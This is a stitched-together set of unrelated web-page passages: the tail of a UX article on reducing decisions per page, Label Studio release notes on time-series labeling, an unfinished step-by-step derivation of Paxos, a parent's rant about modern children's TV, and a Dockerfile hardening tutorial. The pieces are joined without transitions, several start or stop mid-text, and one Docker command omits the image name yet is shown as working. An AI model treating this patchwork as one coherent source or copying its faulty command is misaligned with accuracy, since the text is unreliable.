    <img src="https://learnuxd.io/img/posts/user-decisions/hicks-law.png" alt="When users come across a situation with too many options, sometimes they'll try to bypass the unpleasantness of Hick's Law by hastily making any decision, which they later regret.">
</figure>

<h2 id="so-what">So what?</h2>

<p>As designers, what do we do about all this?</p>

<p>Here are a few ways we can tailor our digital experiences to these heuristics.</p>

<h3 id="decrease-your-dpp">Decrease your DPP</h3>

<p>One helpful exercise is to look at what we can call our DPP: <em>Decisions Per Page</em>.</p>

<p>Take an important page from your interface and count the number of possible decisions a user could make on that page. This includes actions (which always require a decision) or information that leads to a decision.</p>

<p>I’m willing to bet the number is higher than you would have guessed.</p>

<p><strong>If the DPP is too high, what do you do?</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/decisions-per-page.png" alt="Decisions per page">
</figure>

<h3 id="reduce-visual-signals">Reduce visual signals</h3>

<p>Start by reducing the number of colors and fonts. Using more than four meaningful colors causes the “<a href="https://www.nngroup.com/articles/first-impressions-human-automaticity/" target="_blank">rainbow effect</a>” which disorients the brain and creates an impression of ugliness.</p>

<p>Movement is distracting. Use animation sparingly and only for a specific purpose.</p>

<p>Build a design system. It ensures consistency between elements, and prevents users from having to re-learn the interface on every new page.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/design-system.png" alt="Design system">
</figure>

<h3 id="optimize-the-default-experience">Optimize the default experience</h3>

<p>Be aware that many people will never use fancy customization options. Make sure the general default experience provides for all the important <a href="https://learnuxd.io/posts/the-how-and-why-of-user-flows" target="_blank">task flows</a>.</p>

<p>Forms provide lots of opportunities to be helpful. For example, we could pre-populate fields with the most common value or a realistic example. This representative value helps the user understand how to complete the field and what the expected response is. Not to mention it will save most users time and decision-making energy.</p>

<figure>
    <img src="https://learnuxd.io/img/posts/user-decisions/sensible-defaults.png" alt="Sensible defaults">
</figure>

<h3 id="prioritize-for-the-user">Prioritize for the user</h3>

<p>Since many users aren’t going to accurately prioritize things on their own, we should do some of that work for them. The ultimate goal is that they can glance at any page and know instinctively which items are most important.</p>

<p>Knowing what to prioritize requires that you learn about your users, their goals, and their main <a href="https://learnuxd.io/posts/the-how-and-why-of-user-flows" target="_blank">workflows</a>. Think about what is <em>essential</em> (vs. what is optional) and what moves the user <em>forward</em>.</p>

<p>We can give the user visual clues to create a clear hierarchy. Our brain assigns importance to things based on size, color, imagery, contrast, white space, and alignment.</p>

<h3 id="evaluate-your-content">Evaluate your content</h3>

<p>Remember almost all users scan<span>—</span>they don’t read. Classic principles of good writing, including descriptive headings and <a href="https://www.nngroup.com/articles/inverted-pyramid/" target="_blank">inverted-pyramid</a> structures, help users get meaning from content.</p>

<p>Some common red flags include a lack of headings and big, long blocks of text. Call attention to important information using bulleted lists and bold or italic fonts. Take the time to craft your <a href="https://learnuxd.io/posts/7-practical-tips-for-better-microcopy" target="_blank">microcopy</a>.</p>

<h3 id="consider-the-post-click-experience">Consider the post-click experience</h3>

<p>What happens when a user clicks on something? What’s the next thing they see and how does it connect to where they just were? How does it fit into their whole journey through your interface?</p>

<p>It could be easy to think of each page in isolation. <strong>But remember pages aren’t individual silos<span>—</span>they’re pieces of flows.</strong> It’s all a series of connected actions.</p>

<p>Give good <a href="https://learnuxd.io/posts/7-practical-tips-for-better-microcopy" target="_blank">information scent</a> with link labels so users know where they’re going. Allow them to gracefully recover from clicking on the wrong thing to eliminate the “cost” of clicking. Make sure they’re always moving forward.</p>

<p>Remember: we never truly know what an individual user is thinking until we research. When in doubt, <a href="https://learnuxd.io/posts/usability-testing-in-4-simplified-steps" target="_blank">test it out</a>.</p>

  <p>Time series is everywhere! Devices, sensors and events produce time series, for example, your heartbeat can be represented as a series of events measured every second, or your favorite step tracker recording a number of steps you take per minute. </p>
<p>All these signals can be used for ML model development, and we’re excited to present you with one of the first time series data labeling solutions that work across a variety of use-cases and can help you develop ML applications based on time series data!</p>

<p><img src="https://labelstud.io/images/release-080/main.gif"></p><blockquote>
<p>Labeled time series data is crucial if you want to develop supervised ML models for pattern recognition. It can also serve as a ground truth data for validating methods performance. Read below for some of the scenarios and implementation details</p>
</blockquote>
<h2 id="Labeling-UI-Performance"><a href="#Labeling-UI-Performance" title="Labeling UI Performance"></a>Labeling UI Performance</h2><p>A majority of time series datasets tend to have a lot of points. Therefore the tool has to scale well to handle the situation when you have more than 100K points. Initially we’ve tried to use some existing frontend libraries that provide time series implementation, but it turned out that none of them were up for the task, even with just 10,000 points you’d start to experience the lag when zooming or panning. It was clear that we need to come up with a more robust implementation. We’ve based the rendering on d3 and after numerous optimization attempts we’ve got to the desired result:</p>
<h3 id="1-000-000-data-points-and-10-channels"><a href="#1-000-000-data-points-and-10-channels" title="1,000,000 data points and 10 channels"></a><strong>1,000,000 data points and 10 channels</strong></h3><p><img src="https://labelstud.io/images/release-080/ui.gif"></p><p>Some of the techniques we have used include tiling - when we have a big number of datapoint we split it into chunks and render those chunks first, this helps us achieve great performance when the number of data points is very large. When you zoom out the algorithm samples specific points to give you an overview of your time series data.</p>
<h2 id="Working-with-a-variety-of-input-types-out-of-the-box"><a href="#Working-with-a-variety-of-input-types-out-of-the-box" title="Working with a variety of input types out of the box"></a>Working with a variety of input types out of the box</h2><p>For examples below we will be using the following configuration:</p>
<pre><code><span>&lt;<span>View</span>&gt;</span>
  <span>&lt;<span>TimeSeriesLabels</span> <span>name</span>=<span>"label"</span> <span>toName</span>=<span>"ts"</span>&gt;</span>
    <span>&lt;<span>Label</span> <span>value</span>=<span>"Walk"</span> /&gt;</span>
    <span>&lt;<span>Label</span> <span>value</span>=<span>"Run"</span> /&gt;</span>
  <span>&lt;/<span>TimeSeriesLabels</span>&gt;</span>
  
  <span>&lt;<span>TimeSeries</span> <span>name</span>=<span>"ts"</span> <span>valueType</span>=<span>"url"</span> <span>value</span>=<span>"$csv"</span> <span>sep</span>=<span>","</span> <span>overviewChannels</span>=<span>"sen1,sen2"</span>&gt;</span>
    <span>&lt;<span>Channel</span> <span>column</span>=<span>"sen1"</span> /&gt;</span>
    <span>&lt;<span>Channel</span> <span>column</span>=<span>"sen2"</span> /&gt;</span>
  <span>&lt;/<span>TimeSeries</span>&gt;</span>
<span>&lt;/<span>View</span>&gt;</span></code></pre>

<blockquote>
<p>If you’re new to Label Studio, <a href="https://labelstud.io/tags/">learn</a> how you can use tags to setup different labeling interfaces for your data</p>
</blockquote>
<p>Depending on where your time series data is coming from it can be formatted very differently. Label Studio provides a way to configure how time series parsing is done so you don’t have to transform the original file. Let’s start with a simple CSV like that:</p>
<pre><code>time,sen1,sen2
100,1,23
101,2,34
102,3,45</code></pre>

<p>CSV with weirdly formatted datetime, because you’ve captured that from a weird sensor that doesn’t follow the standard:</p>
<pre><code>time,sen1,sen2
2020-Feb-01 9:30,34.23,272
2020-Feb-01 9:31,251.23,352
2020-Feb-01 9:32,337.124,327</code></pre>

<p>In that case, there is <code>timeFormat</code> that can handle parsing for you, it uses <a href="https://docs.python.org/3/library/datetime.html#strftime-and-strptime-format-codes" target="_blank" rel="noopener">strftime</a>.</p>
<p>The <code>valueType</code> controls whether the input is provided as-is, or via a URL. For example, the input file may look like a list of URLs and in that case <code>valueType="url"</code> will load the contents of each URL and expect a time series data inside.</p>
<pre><code>csvURL
http://example.com/path/to/timeseries1.csv
http://example.com/path/to/timeseries2.csv</code></pre>

<p>For the headless CSV, you can use a columns index to point to the right columns. For example, using <code>2</code> in Channel’s <code>column</code> attribute would look for the third column (it starts from zero) inside headless CSV.</p>
<p><code>timeColumn</code> is the name of the column with temporal data, notice that you can skip that altogether, and then it generates that for you.</p>
<p>You can also use <code>timeDisplayFormat</code> to configure the desired output of the temporal column. It can be a number or a date, if a temporal column is a date then use strftime to format it, otherwise, if it’s a number then use <a href="https://github.com/d3/d3-format#locale_format" target="_blank" rel="noopener">d3 number</a> formatting.</p>
<h2 id="Zoom-and-Pan"><a href="#Zoom-and-Pan" title="Zoom and Pan"></a>Zoom and Pan</h2><p>Press <code>ctrl</code> key and use your mouse wheel to zoom and pan. If you have a huge time series, then changing the window position and size inside an overview may not let you zoom as much as you like, because it has a certain limit on its width, then you can continue zooming with a mouse wheel</p>

<p><img src="https://labelstud.io/images/release-080/zoom.gif"></p><h2 id="Multivariate-and-Univariate"><a href="#Multivariate-and-Univariate" title="Multivariate and Univariate"></a>Multivariate and Univariate</h2><p>There are plenty of ways how you can setup the plots, every defined channel is synchronized with any other channel defined inside the same time series object, giving you a multivariate time series labeling experience. You can also define multiple time series objects and get distinct objects.</p>

<p><img src="https://labelstud.io/images/release-080/multi-uni.png"></p><p>Use the <code>Channel</code> tag to represent each additional time-series channel. By providing multiple channels you get a multivariate labeling interface and can label one channel by looking at the behavior of other items at the same timestamp on another channel.</p>
<blockquote>
<p><code>showTracker</code> attribute on TimeSeries object controls if you see the tracker and holding <code>shift</code> key makes it sync between the channels</p>

And when you’re creating a region it always gets snapped to the closest point.</p>

<p><img src="https://labelstud.io/images/release-080/instance.png"></p><h2 id="Configuring-overview"><a href="#Configuring-overview" title="Configuring overview"></a>Configuring overview</h2><p>By default, an overview is created from the first channel, but you have control over that. Use <code>overviewChannels</code> and define what columns are included, it uses the same format as the <code>column</code> parameter, and can also use multiple channels inside an overview if you comma separate it.</p>

Different events may have different representations, and in such cases, visual support is required. TimeSeries tag can synchronize to audio or video.</p>

<p><img src="https://labelstud.io/images/release-080/videosync.png"></p><p>This is an experimental feature right now, and we’re working on finalizing the implementation, but if you have use-cases, ping us in <a href="https://join.slack.com/t/label-studio/shared_invite/zt-cr8b7ygm-6L45z7biEBw4HXa5A2b5pw" target="_blank" rel="noopener">Slack</a>, we will help you to set it up.</p>

  <div itemprop="articleBody">
    <p>In the field of computer science, the Paxos algorithm is notorious for how difficult it is to understand. I had to learn the Paxos algorithm in my distributed systems class. I even have "implemented" it by translating Leslie Lamport's TLA+ to Python. But I didn't understand it until much much later.</p>

<p>Now I have a better understanding of Paxos than I used to, I want to explain it to other people. Not because I'd like to help people, rather, I find that explaining things is a very good way to find blind spots in my own understanding.</p>

<p>So, where do we start? Personally, I dislike explanations that start with a step-by-step breakdown of the algorithm, followed by a proof of why those steps do what they claim to do. Instead, I much prefer to start with the problem the algorithm tries to solve, then iteratively come up with a solution together with the reader. So that's what I am going to do. And now you understand the title.</p>

<p><em>Small disclaimer:</em> The glossaries used in this article is different from what is commonly used for Paxos. I just picked the ones that made the most sense for my narrative.</p>

<h2 id="the-problem">The problem</h2>

<p>The distributed consensus problem is widely useful, so the reader probably doesn't need to be motivated. Here I will just simply state the problem.</p>

<p>There is a group of agents (let's call them $\sc{CLIENT}s$), who want to choose a number among their selections. Any number is fine, as long as everyone agrees on the same number.</p>

<p>Here, there are a few assumptions we will make to make this problem meaningful:</p>

<ul>
  <li>All the agents - including but not limited to the $\sc{CLIENT}s$, as we will add more types of agents later - are well-behaved. Meaning they all execute the prescribed algorithms faithfully, and don't maliciously try to trick other agents. (If you like jargons: Byzantine failures don't occur.)</li>
  <li>Agents can talk to each other by sending each other messages, but the messages they send to each other could take arbitrarily long before reaching their destination, and might get lost (but never altered).</li>
</ul>

<p>The agents could also "fail". However, failing is equivalent to all messages sent to/from that agent being lost forever. So whether we have this assumption or not won't change the algorithm we come up with.</p>

<p>Also, to not complicate things, we are only solving the "single-round" consensus problem in this article, meaning as the output of this algorithm, all of the $\sc{CLIENT}s$ will get a single number which they agree on.</p>

<h2 id="solution-searching-adventure">Solution searching adventure</h2>

<h3 id="iteration-0">Iteration 0</h3>

<p>When trying to solve a complex problem such as this one, it's usually a good idea to start by simplifying the problem.
As a start, let's just ignore the need to be reliable entirely.</p>

<p>If we throw reliability out the window, it should be easy to come up with a very simple solution: we add an agent (let's call it $\sc{COORDINATOR}$).
The $\sc{CLIENTS}$ send whatever number they pick to the $\sc{COORDINATOR}$ in a $\sc{PROPOSAL}(client_i, x)$ message, where $x$ is the number
proposed by the $i$-th $\sc{CLIENT}$. The $\sc{COORDINATOR}$ picks an arbitrary proposal (say, $x'$),
and informs the other $\sc{CLIENT}s$ about this decision.
Specifically, the $\sc{COORDINATOR}$ will just reply with a $\sc{CHOSEN}(x')$ message to all the $\sc{PROPOSAL}(\ldots)$ messages it has
received and will receive.</p>

<p>If we assume no messages ever get lost, it is quite easy to see that every $\sc{CLIENT}$ will get a number. And because only one number is ever chosen, they will all get the same number.</p>

<p>It is also easy to see why this solution is impractical: it has a single point of failure. Once the singular $\sc{COORDINATOR}$ fails, no further progress can be made.</p>

<h3 id="iteration-1">Iteration 1</h3>

<p>To improve this almost looks easy at first glance: just add more $\sc{COORDINATOR}s$!</p>

<p>Sure, more $\sc{COORDINATOR}s$ would remove the single point of failure. However, if there are more than one $\sc{COORDINATOR}s$, they might individually make different decisions, which results in the $\sc{CLIENT}s$ having disagreement.</p>

<p>What if we let the $\sc{COORDINATOR}s$ reach an agreement among themselves before responding? But wait, doesn't that sound familiar? Having a group of agents reaching an agreement, that's exactly what we added the $\sc{COORDINATOR}s$ to solve. We just made the problem cyclic.</p>

<p>Let's take a step back. Is there a way for the clients to reach an agreement without having the $\sc{COORDINATOR}s$ communicate with each other?</p>

<p>In other words, among the decisions of the $\sc{COORDINATOR}s$, is there an deterministic algorithm to pick out a specific one that is robust against message losses?</p>

<p>This might sound hard, but it's actually quite simple: pick the decision that is backed by more than half of the $\sc{COORDINATOR}s$.</p>

<p>There can't be two decisions both with more than half of the $\sc{COORDINATOR}s$ backing them; and if a decision doesn't have that many $\sc{COORDINATOR}s$ backing it, it won't appear to have more backing $\sc{COORDINATOR}s$ through message losses.</p>

<p>Since this approach resembles a majority vote, let's call $\sc{COORDINATOR}$ decisions $\sc{VOTE}(coord_i, x)$ from now on, where $x$ is the number picked by the $i$-th $\sc{COORDINATOR}$. Each $\sc{COORDINATOR}$ has a single vote, because each of them only makes a single decision.</p>

<p>Obviously, our solution cannot be infinitely reliable. If more than half of the $\sc{COORDINATOR}s$ went down, there will never be a majority reached. But this is already vastly better than our first solution, and the reliability scales with the number of $\sc{COORDINATOR}s$. So we will call it good enough.</p>

<p>Sadly, this solution doesn't actually work: there might not be a majority at all! For example, it's possible that three of the proposals each get a third of the votes. We would have a stalemate in that case.</p>

<h3 id="iteration-2">Iteration 2</h3>

<p>Again, a solution seems straightforward: just try again in case of a stalemate.</p>

<p>But then again, things aren't that simple.</p>

<p>First of all, the $\sc{COORDINATOR}s$ need to be made aware of a retry. Otherwise, because each $\sc{COORDINATOR}$ only has one vote, they won't be able to vote again even if the $\sc{CLIENT}s$ retry.</p>

<p>To do that, we attach an attempt id to all the messages sent. i.e. $\sc{PROPOSAL}(client_i, x)$ becomes $\sc{PROPOSAL}(\#attempt, client_i, x)$, and so forth. Each time a $\sc{CLIENT}$ retries, it bumps $\#attempt$ to the maximum $\#attempt$ it knows of plus 1. And the $\sc{COORDINATOR}s$ should only responds to messages with the most recent $\#attempt$.</p>

<p>Hopefully the intent of the $\#attempt$ number is clear. (<a href="https://github.com/yshui/explain-algorithms/issues/new">Let me know</a> if not.)</p>

<p>Are we good now? Unfortunately, no. Consider this scenario:</p>

<p>There were 2 clients. They proposed their numbers, the $\sc{COORDINATOR}$ voted on them and all agreed on a single number, $x_1$, all is good. But, all of the $\sc{VOTE}(\ldots)$ messages got lost on the way to $client_2$, while $client_1$ received all of the messages just fine. At this point, $client_1$ thought $x_1$ is the number, but $client_2$ went on to retry. The $\sc{COORDINATOR}s$ voted again, and got $x_2$. This time, all the messages sent to $client_1$ got lost.</p>

<p>And behold, we got the two clients to disagree.</p>

<p>There is an important insight to be had here. Whenever a $\sc{COORDINATOR}$, say $coord_i$, sends out a $\sc{VOTE}(\ldots, coord_i, x)$, there is a chance that some $\sc{CLIENT}$ would adopt $x$. If $coord_i$ ever sends out two votes with different $x$, there is a chance that some of the $\sc{CLIENT}s$ would disagree.</p>

<p>In other words, once a $\sc{COORDINATOR}$ has revealed its vote, it has to stick to it.</p>

<p>This seems to run contrary to our attempt: if the $\sc{COORDINATOR}s$ cannot change their votes, what's the point of retrying? A stalemate will be a stalemate forever.</p>

<p>Looks like we reached a dead end with this type of voting. It appears the problem stems from the fact that the $\sc{COORDINATOR}s$ have to commit to their votes.</p>

<p>So, what if we introduce a form of non-commitment voting?</p>

<h3 id="iteration-3">Iteration 3</h3>

<p>Let's explore this idea. Say, the $\sc{COORDINATOR}s$ could now send a $\sc{TENTATIVE}\sc{VOTE}(\#attempt, coord_i, x)$ message, to tentatively vote for $x$.</p>

<p>Obviously, the $\sc{CLIENT}s$ couldn't adopt $x$ right away. So what's this vote good for?</p>

<p>Ah, right, it could get us to a majority.</p>

<p>It is correct that tentative votes don't lead directly to an agreement among $\sc{CLIENT}s$, but it can show us when a majority has formed among the $\sc{COORDINATOR}s$.</p>

<p>Once a $\sc{CLIENT}$ sees a majority tentative vote, it can then message the $\sc{COORDINATOR}s$ to ask for an actual vote. (Let's call this message $\sc{PLEASE}\sc{VOTE}(\#attempt, client_i)$). Intuitively, the $\sc{COORDINATOR}s$ have to make the same vote in the actual vote as their tentative votes.</p>

<p>If all goes well, we would get a majority and an agreement. If there is no majority, the $\sc{COORDINATOR}s$ won't even start a vote, so they are free to change their mind. So the $\sc{CLIENT}s$ could start another attempt which might have a different outcome.</p>

<p>What if things don't go well? What if the $\sc{PLEASE}\sc{VOTE}$ messages weren't received by some of the $\sc{COORDINATOR}s$?
In that case, some of the $\sc{COORDINATOR}s$ would have voted, and their decisions cannot be changed. That is to say, in all subsequent attempts, these $\sc{COORDINATOR}s$ will always vote for what they have voted for, whether it's a tentative vote, or the actual vote. But that doesn't create a problem for us. There was a majority in the tentative votes, and now we solidified part of the tentative votes. There is at least one way we can still reach a majority in the next round: everyone votes the same as they did in this round. And we can prove this inductively for all future rounds.</p>

<p>From this, we can have a rough image of how the algorithm functions: as attempts are being made, more and more $\sc{COORDINATOR}s$ start to make up their mind which number they will commit to, while making sure a majority could still be reached. Eventually, …</p></div></article></div></div></div>

<p>I don’t want to be one of those complaining old men, constantly bemoaning every difference that I see between the world of my youth and that of today.I’m not that old anyway; at 38 I consider myself to be just barely reaching adulthood.</p>
<p>I have two small children of the girl persuasion, ages 2 and 4. The pandemic has changed so much about their lives, but one change is that we all have a lot more screen time than before.</p>
<p>Children’s programming is shit today. Boring computer-generated animation, interchangeable characters with impossibly cheerful voices. Most of it seems lazy and half-baked. You could take the plots and characters from any number of shows and switch them around and it would all fit fine. I’m talking about shows like <em>PJ Masks</em>, <em>Paw Patrol</em>, and <em>Mickey Mouse Clubhouse</em>.</p>
<p><em>Mickey Mouse Clubhouse</em> is a particularly bad offender, because I have such strong childhood attachments to the source material. It might be the worst show ever made. It’s weird, but not in a fun way like <em>Yo Gabba Gabba</em>. Completely humorless.</p>
<p>Even <em>Sesame Street</em>, of which I am a staunch advocate, uses obvious filler sketches like <a href="https://www.youtube.com/watch?v=M6TkpZx1dzQ"><em>Journey to Ernie</em></a>, which is absolute garbage.</p>
<p>Contrast that to the shows I watched as a kid. We’ve been playing <em>Fraggle Rock</em>, <em>The Elephant Show</em>, <em>Magic Schoolbus</em>, <em>Beakman’s World</em>, <em>Bill Nye the Science Guy</em>. They’re just better.</p>
<p>The Fraggles are such well-developed characters, and the show does such a good job of showing the fragile beauty of their ecosystem. There are layers of information that can be gleaned on subsequent rewatches. As children mature, there are jokes and nuances they start to grasp. The show is actually entertaining for adults.</p>
<p>Contrast that to <em>The PJ Masks</em>, a show that makes me want to actually put my head through the TV.</p>

October 27, 2020 | https://www.pybootcamp.com/blog/how-to-write-dockerfile-python-apps/ | <a href="https://web.archive.org/web/*/https://www.pybootcamp.com/blog/how-to-write-dockerfile-python-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><article><p>In the previous article, <a href="https://www.pybootcamp.com/blog/how-to-containerize-python-application/" title="How to containerize a Python Application">how to containerize a Python application</a>, we created a Dockerfile and containerized our application from scratch.</p>
<p>Now we really want our Dockerfile to stand out, <strong>make it more production-ready</strong>, that's the goal of this article.</p>
<p>We will cover 6 different ways to improve our <code>Dockerfile</code>:</p>
<ul>
<li>setting env variables and a working directory</li>
<li>avoiding invalidating the Docker cache</li>
<li><strong>changing the default user to non-root</strong></li>
<li>taking care of zombie processes</li>
<li>correctly forwarding signals to our application</li>
<li>updating <code>pip</code>, <code>setuptools</code> and <code>wheel</code></li>
</ul>
<h3>Intro</h3>
<p>This is the <code>Dockerfile</code> we created last time:</p>
<div data-language="dockerfile"><pre><code>
<span>FROM</span> python<span>:</span>3.8.3<span>-</span>slim<span>-</span>buster


<span>COPY</span> . /src


<span>RUN</span> pip install <span>-</span>r /src/requirements.txt</code></pre></div>
<p>While fully functional, there are a few things we can improve regarding usability, security and performance.</p>
<p>You can clone this <a href="https://github.com/py-bootcamp/movie-recommender/tree/part-1">repository</a> if you want to follow along.</p>
<h3>Passing the git commit hash</h3>
<p>We want to <em>mark</em> each Docker image and container with a tag, this tag is the <code>git commit hash</code>.</p>
<p><strong>At runtime we should be able to determine which version of our software we are running.</strong></p>
<blockquote>
<p>The idea is that every artifact we generate is traceable, we can go back and check which commit generated it.</p>
</blockquote>
<p>The <a href="https://docs.docker.com/engine/reference/builder/#arg">ARG</a> and <a href="https://docs.docker.com/engine/reference/builder/#env">ENV</a> instructions can help us achieving it.</p>
<p><code>ARG</code> specifies arguments that we can pass to the <code>docker build</code> command, <code>ENV</code> are env variables set inside the <code>Dockerfile</code> and accessible at runtime, from within the container.</p>
<p>This is the new <code>Dockerfile</code>, with <code>ARG</code> and <code>ENV</code>:</p>
<div data-language="dockerfile"><pre><code><span>FROM</span> python<span>:</span>3.8.3<span>-</span>slim<span>-</span>buster


<span>ARG</span> GIT_HASH
<span>ENV</span> GIT_HASH=$<span>{</span>GIT_HASH<span>:</span><span>-</span>dev<span>}</span>


<span>COPY</span> . /src

<span>RUN</span> pip install <span>-</span>r /src/requirements.txt</code></pre></div>
<p>The <code>-dev</code> is a way to specify defaults. If the <code>GIT_HASH</code> argument is omitted then <code>GIT_HASH</code> will be set to <code>dev</code>.</p>
<p>Let's build our Docker image and check the <code>GIT_HASH</code> env variable:</p>
<div data-language="bash"><pre><code><span>&gt;</span> docker build -t movie-app <span>.</span>
<span>&gt;</span> docker run --rm movie-app <span>env</span> <span>|</span> <span>grep</span> GIT_HASH
<span>GIT_HASH</span><span>=</span>dev</code></pre></div>
<p>How do we pass the git commit hash to our Docker image?</p>
<p>We use the <a href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg"><code>--build-arg</code></a> flag from the Docker cli:</p>
<div data-language="bash"><pre><code>
<span>&gt;</span> <span>export</span> <span>GIT_HASH</span><span>=</span><span><span>$(</span><span>git</span> rev-parse HEAD<span>)</span></span>
<span>&gt;</span> docker build --build-arg <span>GIT_HASH</span><span>=</span><span>${GIT_HASH<span>:</span><span>:</span>7}</span> -t movie-app <span>.</span>
<span>&gt;</span> docker run --rm movie-app <span>env</span> <span>|</span> <span>grep</span> GIT_HASH
<span>GIT_HASH</span><span>=</span>6a78e6b</code></pre></div>
<p>We don't need the whole commit hash, the first 7 characters are enough.</p>
<blockquote>
<p>Why are we not passing the base image using <code>ARG</code>?
Because we don't want to change the base Docker image from the Docker cli, but only through a new commit.</p>
</blockquote>
<h3>Adding a working directory</h3>
<p>Right now we are copying our files inside a <code>/src</code> folder and then we specify all the other paths relative to <code>/src</code>.</p>
<p>Wouldn't be nicer if we could specify a working directory and run commands from that folder?</p>
<p>That would be neat, and <a href="https://docs.docker.com/engine/reference/builder/#workdir">WORKDIR</a> is exactly what we need.</p>
<div data-language="dockerfile"><pre><code><span>FROM</span> python<span>:</span>3.8.3<span>-</span>slim<span>-</span>buster

<span>ARG</span> GIT_HASH
<span>ENV</span> GIT_HASH=$<span>{</span>GIT_HASH<span>:</span><span>-</span>dev<span>}</span>


<span>WORKDIR</span> /project


<span>COPY</span> . .


<span>RUN</span> pip install <span>-</span>r requirements.txt</code></pre></div>
<p>After we specify a <code>WORKDIR</code>, any <code>RUN</code>, <code>CMD</code>, <code>ENTRYPOINT</code>, <code>COPY</code> and <code>ADD</code> instructions that follow will use that working directory.</p>
<p>Note how the path of <code>COPY</code> and <code>pip install</code> changed.</p>
<p>Let's test our application:</p>
<div data-language="text"><pre><code>&gt; docker build -t movie-app .
# 💥 it's not python /src/app.py anymore 💥
&gt; docker run --rm -p 8888:8888 movie-app python app.py
&gt; curl localhost:8888</code></pre></div>
<h3>Caching dependencies</h3>
<p>Our application has a small number of external dependencies, the <code>requirements.txt</code> contains only a few dependencies, so the <code>pip install</code> command is fast, just a couple of seconds.</p>
<p>What if it were taking minutes instead of seconds?</p>
<p>Wouldn't be better to cache our dependencies until something changes?</p>
<p>If you try to modify any file inside our application's folder and try to run the Docker build command you will see how Docker builds the image starting from zero.</p>
<p>If you check the console output you should see something like this:</p>
<div data-language="bash"><pre><code>Step <span>6</span>/7 <span>:</span> RUN pip <span>install</span> -r requirements.txt
 ---<span>&gt;</span> Running <span>in</span> 2233484e3f72</code></pre></div>
<p>Basically any change to our codebase, even if it's not related to <code>requirements.txt</code> will invalidate the Docker cache.</p>
<p>We can be smarter and save some time, <strong>we just need to install our dependencies first</strong>.</p>
<div data-language="dockerfile"><pre><code><span>FROM</span> python<span>:</span>3.8.3<span>-</span>slim<span>-</span>buster

<span>ARG</span> GIT_HASH
<span>ENV</span> GIT_HASH=$<span>{</span>GIT_HASH<span>:</span><span>-</span>dev<span>}</span>

<span>WORKDIR</span> /project


<span>COPY</span> requirements.txt ./
<span>RUN</span> pip install <span>-</span>r requirements.txt


<span>COPY</span> . .</code></pre></div>
<p>We added a new <code>COPY</code>, just for <code>requirements.txt</code>, and moved the <code>pip install</code> right after.</p>
<p>If you now try to build the Docker image again, then change the <code>main.py</code> and rerun the <code>docker build</code> command again that shouldn't invalidate the cache.</p>
<p>This is the output you should see, <code>Using cache</code>:</p>
<div data-language="text"><pre><code>&gt; docker build -t movie-app .
Step 6/7 : RUN pip install -r requirements.txt
 ---&gt; Using cache
 ---&gt; cbe7b2865e10</code></pre></div>
<h3>Running your container as non-root user</h3>
<p>By default the user running your command inside a Docker container is <code>root</code>.</p>
<div data-language="text"><pre><code>&gt; docker run --rm movie-app whoami
root</code></pre></div>
<blockquote>
<p>Long story short, Docker containers should not run as root and is highly recommended to change the default user to a non-root user.</p>
</blockquote>
<p>How do we change the user?</p>
<p>We create a new one and we set the new user with the <a href="https://docs.docker.com/engine/reference/builder/#user">USER</a> instruction.</p>
<div data-language="dockerfile"><pre><code><span>FROM</span> python<span>:</span>3.8.3<span>-</span>slim<span>-</span>buster

<span>ARG</span> GIT_HASH
<span>ENV</span> GIT_HASH=$<span>{</span>GIT_HASH<span>:</span><span>-</span>dev<span>}</span>

<span>WORKDIR</span> /project




<span>RUN</span> useradd <span>-</span>m <span>-</span>r user &amp;&amp; \
    chown user /project


<span>COPY</span> requirements.txt ./
<span>RUN</span> pip install <span>-</span>r requirements.txt

<span>COPY</span> . .


<span>USER</span> user</code></pre></div>
<div data-language="text"><pre><code>&gt; docker build -t movie-app .
&gt; docker run --rm movie-app whoami
user</code></pre></div>
<p>Our <code>user</code> can't create new files outside of the <code>/project</code> folder (user is the owner of the folder):</p>
<div data-language="text"><pre><code>&gt; docker run --rm touch /hello
touch: cannot touch '/hello': Permission denied
# 👇 but this command would work
&gt; docker run --rm touch hello</code></pre></div>
<p>Let's test our application to be sure it has all the necessary permissions:</p>
<div data-language="bash"><pre><code><span>&gt;</span> docker run --rm -p <span>8888</span>:8888 movie-app python app.py
<span>&gt;</span> <span>curl</span> localhost:8888</code></pre></div>
<h3>Taking care of zombie processes and signals</h3>
<p>Each Docker container is a PID namespace, and A PID namespace is a tree, which starts at PID 1, commonly called init.</p>
<p>The entire process of starting the system and shutting it down is maintained by init, when you run a Docker container, PID 1 is what you set inside your <code>ENTRYPOINT</code>.</p>
<p>If you don't set it by default Docker will use <code>/bin/sh -c</code>, which does not pass signals, making almost impossible to gracefully stop your application.</p>
<p>This is why we need a better init, <a href="https://github.com/krallin/tini">Tini</a>.</p>
<p><code>Tini</code> doesn't only take care of reaping zombie processes but also of forwarding any signals we send to the Docker container to our application process.</p>
<blockquote>
<p>Forwarding signals correctly is really important. Kubernetes relies on signals during the lifecycle of a pod.</p>
</blockquote>
<p><a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#pod-termination">More about Kubernetes and signals here</a>.</p>
<div data-language="dockerfile"><pre><code><span>FROM</span> python<span>:</span>3.8.3<span>-</span>slim<span>-</span>buster

<span>ARG</span> GIT_HASH
<span>ENV</span> GIT_HASH=$<span>{</span>GIT_HASH<span>:</span><span>-</span>dev<span>}</span>

<span>ENV</span> TINI_VERSION=<span>"v0.19.0"</span>


<span>ADD</span> https<span>:</span>//github.com/krallin/tini/releases/download/$<span>{</span>TINI_VERSION<span>}</span>/tini /tini
<span>RUN</span> chmod +x /tini


<span>WORKDIR</span> /project

<span>RUN</span> useradd <span>-</span>m <span>-</span>r user &amp;&amp; \
    chown user /project

<span>COPY</span> requirements.txt ./
<span>RUN</span> pip install <span>-</span>r requirements.txt

<span>COPY</span> . .

<span>USER</span> <span>user</span>


<span>ENTRYPOINT</span> <span>[</span><span>"/tini"</span><span>,</span> <span>"--"</span><span>]</span></code></pre></div>
<p>We have two new instructions here, <a href="https://docs.docker.com/engine/reference/builder/#entrypoint">ADD</a> and <a href="https://docs.docker.com/engine/reference/builder/#entrypoint">ENTRYPOINT</a>.</p>
<p><code>ADD</code> is a really useful instruction, it can add remote files to you Docker image.</p>
<p>The <code>ENTRYPOINT</code> specifies the entry point for any command, in our case <code>python app.py</code>, pretty much like running <code>/tini -- python app.py</code></p>
